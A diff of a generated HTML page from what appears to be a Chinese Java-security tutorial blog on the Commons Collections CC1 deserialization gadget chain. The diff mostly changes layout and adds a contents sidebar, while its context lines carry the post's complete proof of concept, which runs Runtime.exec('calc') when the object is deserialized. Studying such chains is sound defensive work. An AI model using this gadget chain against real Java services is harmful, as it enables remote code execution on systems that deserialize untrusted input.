@@ -168,17 +168,19 @@
     
     <div class="content index py4 ">
         
-        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
-  <header>
-    
+        
+<div class="post-layout">
+  <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+    <header>
+      
     <h1 class="posttitle p-name" itemprop="name headline">
         Commons-Collection01
     </h1>
 
 
 
-    <div class="meta meta-post">
-      
+      <div class="meta meta-post">
+        
     <div class="postdate">
       
         <time datetime="2025-04-22T13:46:20.000Z" class="dt-published" itemprop="datePublished">2025-04-22</time>
@@ -187,26 +189,26 @@
     </div>
 
 
-      
+        
     <div class="article-category">
         <i class="fa-solid fa-archive"></i>
         <a class="category-link" href="/categories/JAVA%E5%AE%89%E5%85%A8/">JAVA安全</a>
     </div>
 
 
-      
+        
     <div class="article-tag">
         <i class="fa-solid fa-tag"></i>
         <a class="p-category" href="/tags/CC%E9%93%BE/" rel="tag">CC链</a>
     </div>
 
 
-    </div>
-  </header>
-  
+      </div>
+    </header>
+    
 
-  <div class="content e-content" itemprop="articleBody">
-    <h2 id="CC1调用链"><a href="#CC1调用链" class="headerlink" title="CC1调用链"></a>CC1调用链</h2><h2 id="图解"><a href="#图解" class="headerlink" title="图解"></a>图解</h2><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231010164439054.png" alt="+" style="zoom: 200%;" />
+    <div class="content e-content" itemprop="articleBody">
+      <h2 id="CC1调用链"><a href="#CC1调用链" class="headerlink" title="CC1调用链"></a>CC1调用链</h2><h2 id="图解"><a href="#图解" class="headerlink" title="图解"></a>图解</h2><img src="https://jxdgx.oss-cn-beijing.aliyuncs.com/test/image-20231010164439054.png" alt="+" style="zoom: 200%;" />
 
 <h2 id="InvokerTransformer类的transform方法"><a href="#InvokerTransformer类的transform方法" class="headerlink" title="InvokerTransformer类的transform方法"></a>InvokerTransformer类的transform方法</h2><p>首先我们在InvokerTransformer类中传入我们要传入的对象这样我们就可以实现对其控制</p>
 <p>我们首先进行调试</p>
@@ -315,8 +317,17 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123;</span><br><span class="line"><span class="comment">//恶意攻击类,命令执行</span></span><br><span class="line">            Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">            <span class="comment">//通过ChainedTransformer循环遍历到ConstantTransformer的transform方法</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//        chainedTransformer.transform(Runtime.class);</span></span><br><span class="line">            HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object,Object&gt;();</span><br><span class="line">            map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;1111&quot;</span>);</span><br><span class="line">            Map&lt;Object,Object&gt; transformedmap = TransformedMap.decorate(map,<span class="literal">null</span>,chainedTransformer);</span><br><span class="line"><span class="comment">//创建AnnotationInvocationHandler类</span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">annotation</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">            annotation.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotation.newInstance(Target.class,transformedmap);</span><br><span class="line">            <span class="comment">//创建AnnotationInvocationHandler实例并将transformedmap赋值给memberValues属性。</span></span><br><span class="line"></span><br><span class="line">            serialize(o);</span><br><span class="line">            unserialize(<span class="string">&quot;web.bin&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;web.bin&quot;</span>);</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">            objectOutputStream.writeObject(object);</span><br><span class="line">          </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename);</span><br><span class="line">           <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">            objectInputStream.readObject();</span><br><span class="line">           </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 
-  </div>
-</article>
+    </div>
+  </article>
+  
+    <aside class="post-sidebar-toc">
+      <div class="post-sidebar-toc-inner">
+        <div class="post-sidebar-toc-title">Contents</div>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#CC1%E8%B0%83%E7%94%A8%E9%93%BE"><span class="toc-number">1.</span> <span class="toc-text">CC1调用链</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%BE%E8%A7%A3"><span class="toc-number">2.</span> <span class="toc-text">图解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#InvokerTransformer%E7%B1%BB%E7%9A%84transform%E6%96%B9%E6%B3%95"><span class="toc-number">3.</span> <span class="toc-text">InvokerTransformer类的transform方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TransformedMap%E4%B8%AD%E7%9A%84checkSetValue%E6%96%B9%E6%B3%95%E4%B8%AD%E8%B0%83%E7%94%A8%E4%BA%86valueTransformer-transform%EF%BC%88%EF%BC%89"><span class="toc-number">4.</span> <span class="toc-text">TransformedMap中的checkSetValue方法中调用了valueTransformer.transform（）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MapEntry%E7%B1%BB%E7%9A%84setValue%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8%E4%BA%86TransformedMap%E7%B1%BB%E4%B8%AD%E7%9A%84checkSetValue%E6%96%B9%E6%B3%95"><span class="toc-number">5.</span> <span class="toc-text">MapEntry类的setValue方法调用了TransformedMap类中的checkSetValue方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%A5%E5%8F%A3%E7%B1%BB"><span class="toc-number">6.</span> <span class="toc-text">入口类</span></a></li></ol>
+      </div>
+    </aside>
+  
+</div>
 
 
 
